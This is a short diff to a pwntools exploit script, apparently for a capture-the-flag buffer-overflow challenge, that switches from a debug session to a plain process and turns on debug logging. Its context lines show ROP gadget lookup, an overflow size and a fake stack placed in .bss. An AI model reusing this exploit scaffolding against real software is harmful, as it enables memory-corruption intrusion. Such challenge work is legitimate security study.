@@ -8,6 +8,7 @@ inputs = [b'ex4722', b'What do you mean? African or European swallow?\x00', b'ex
 bof_size = 38
 exe = ELF(binary_name)
 rop = ROP(binary_name)
+context.log_level = 'debug'
 
 
 gdbscript = r"""
@@ -52,7 +53,8 @@ stack_gad = rop.find_gadget(["pop ebx","pop esi", "pop edi", "pop ebp"]).address
 ret = rop.find_gadget(["ret"]).address
 
 
-p = new_debug()
+# p = new_debug()
+p = new_processes()
 fake_stack = exe.bss() + 0x900
 
 table_padding = 12 
